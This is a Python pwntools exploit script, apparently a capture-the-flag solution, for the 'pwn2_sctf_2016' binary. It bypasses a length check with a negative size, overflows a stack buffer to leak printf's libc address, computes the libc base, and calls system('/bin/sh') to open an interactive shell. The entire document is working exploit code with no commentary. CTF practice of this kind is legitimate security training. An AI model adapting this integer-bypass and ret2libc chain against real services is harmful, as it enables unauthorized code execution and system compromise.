from pwn import * 
context.log_level = 'debug'
io = process('./pwn2_sctf_2016')
#io = gdb.debug('./pwn2_sctf_2016','break *vuln')
elf = ELF('./pwn2_sctf_2016')
Lib = ELF('/lib/i386-linux-gnu/libc.so.6')
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
vuln_addr = elf.sym['vuln']
main_addr = elf.sym['main']
offset =48
#1
io.sendlineafter('How many bytes do you want me to read?',b'-1')
#2
payload1 = b'A'*offset+p32(printf_plt)+p32(vuln_addr)+p32(printf_got)
io.sendlineafter(b'data!\n',payload1)
io.recvuntil('\n')
a = io.recv(4)
printf_addr = u32(a)
print('lib->',hex(printf_addr))
#3
baseoffset = printf_addr - Lib.symbols['printf']
sys_addr = Lib.sym['system']+baseoffset
shell_addr = baseoffset+next(Lib.search(b'/bin/sh'))
io.sendlineafter(b'read?',b'-1')
payload2 = b'A'*offset+p32(sys_addr)+p32(main_addr)+p32(shell_addr)
io.recvuntil(b'data!\n')
io.sendline(payload2)

io.interactive()
